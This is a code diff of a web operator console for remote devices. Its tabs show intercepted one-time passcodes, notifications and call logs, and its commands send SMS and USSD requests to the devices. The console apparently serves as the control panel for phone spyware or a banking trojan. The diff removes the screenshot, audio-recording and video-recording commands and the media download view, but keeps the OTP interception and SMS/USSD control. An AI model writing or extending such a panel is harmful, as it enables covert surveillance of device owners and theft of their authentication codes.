@@ -389,7 +389,6 @@
             <button class="tab" data-tab="otp" type="button">OTP</button>
             <button class="tab" data-tab="notifications" type="button">Notifications</button>
             <button class="tab" data-tab="calls" type="button">Calls</button>
-            <button class="tab" data-tab="media" type="button">Media</button>
             <button class="tab" data-tab="history" type="button">Command history</button>
           </div>
           <div id="tabCommands">
@@ -437,7 +436,6 @@
           <div id="tabOtp" class="hidden"></div>
           <div id="tabNotifications" class="hidden"></div>
           <div id="tabCalls" class="hidden"></div>
-          <div id="tabMedia" class="hidden"></div>
           <div id="tabHistory" class="hidden"></div>
         </div>
       </div>
@@ -487,8 +485,7 @@
   <script>
     const COMMAND_TYPES = [
       'ping', 'sync', 'restart_services', 'refresh_config', 'clear_cache',
-      'upload_logs', 'update_config', 'record_audio', 'record_video',
-      'take_screenshot', 'send_sms', 'ussd'
+      'upload_logs', 'update_config', 'send_sms', 'ussd'
     ];
     const QUICK_COMMANDS = [
       { type: 'ping', label: 'Ping' },
@@ -496,9 +493,6 @@
       { type: 'restart_services', label: 'Restart agent' },
       { type: 'refresh_config', label: 'Refresh config' },
       { type: 'upload_logs', label: 'Upload logs' },
-      { type: 'take_screenshot', label: 'Screenshot' },
-      { type: 'record_audio', label: 'Record audio', payload: { duration_sec: 10 } },
-      { type: 'record_video', label: 'Record video', payload: { duration_sec: 10 } },
       { type: 'clear_cache', label: 'Clear cache', danger: true },
     ];
 
@@ -697,7 +691,6 @@
       $('tabOtp').classList.toggle('hidden', tab !== 'otp');
       $('tabNotifications').classList.toggle('hidden', tab !== 'notifications');
       $('tabCalls').classList.toggle('hidden', tab !== 'calls');
-      $('tabMedia').classList.toggle('hidden', tab !== 'media');
       $('tabHistory').classList.toggle('hidden', tab !== 'history');
       if (!state.selectedId) return;
       if (tab === 'health') loadHealth();
@@ -705,7 +698,6 @@
       if (tab === 'otp') loadTable('otp', '/devices/' + state.selectedId + '/otp', 'otp', renderOtp);
       if (tab === 'notifications') loadTable('notifications', '/devices/' + state.selectedId + '/notifications', 'notifications', renderNotif);
       if (tab === 'calls') loadTable('calls', '/devices/' + state.selectedId + '/calls', 'calls', renderCalls);
-      if (tab === 'media') loadMedia();
       if (tab === 'history') loadTable('history', '/devices/' + state.selectedId + '/commands', 'commands', renderCommands);
     }
 
@@ -950,52 +942,6 @@
           <td class="mono">${escapeHtml(typeof r.payload === 'string' ? r.payload : JSON.stringify(r.payload || {}))}</td>
         </tr>`).join('')}
       </tbody></table>`;
-    }
-
-    async function loadMedia() {
-      const el = $('tabMedia');
-      el.innerHTML = '<div class="empty">Loading…</div>';
-      try {
-        const data = await api('/devices/' + state.selectedId + '/media');
-        const rows = data.media || [];
-        if (!rows.length) {
-          el.innerHTML = '<div class="empty">No media uploads</div>';
-          return;
-        }
-        el.innerHTML = wrapTable(`<table><thead><tr><th>When</th><th>Type</th><th>Content</th><th>Size</th><th></th></tr></thead><tbody>
-          ${rows.map((r) => `<tr>
-            <td>${escapeHtml(r.created_at || '')}</td>
-            <td>${escapeHtml(r.media_type || '')}</td>
-            <td>${escapeHtml(r.content_type || '')}</td>
-            <td>${escapeHtml(r.size_bytes ?? '')}</td>
-            <td><a href="/api/v1/media/${encodeURIComponent(r.id)}" target="_blank" rel="noopener">Download</a></td>
-          </tr>`).join('')}
-        </tbody></table>`) +
-        `<p class="status">Downloads use your signed-in session token.</p>`;
-        // Fix download with Authorization via blob fetch
-        el.querySelectorAll('a').forEach((a) => {
-          a.onclick = async (ev) => {
-            ev.preventDefault();
-            const id = a.getAttribute('href').split('/').pop();
-            const res = await fetch('/api/v1/media/' + id, {
-              headers: { Authorization: 'Bearer ' + state.access },
-            });
-            if (!res.ok) {
-              alert('Download failed: HTTP ' + res.status);
-              return;
-            }
-            const blob = await res.blob();
-            const url = URL.createObjectURL(blob);
-            const tmp = document.createElement('a');
-            tmp.href = url;
-            tmp.download = id;
-            tmp.click();
-            URL.revokeObjectURL(url);
-          };
-        });
-      } catch (e) {
-        el.innerHTML = `<div class="status err">${escapeHtml(e.message)}</div>`;
-      }
     }
 
     async function loadWebhooks() {
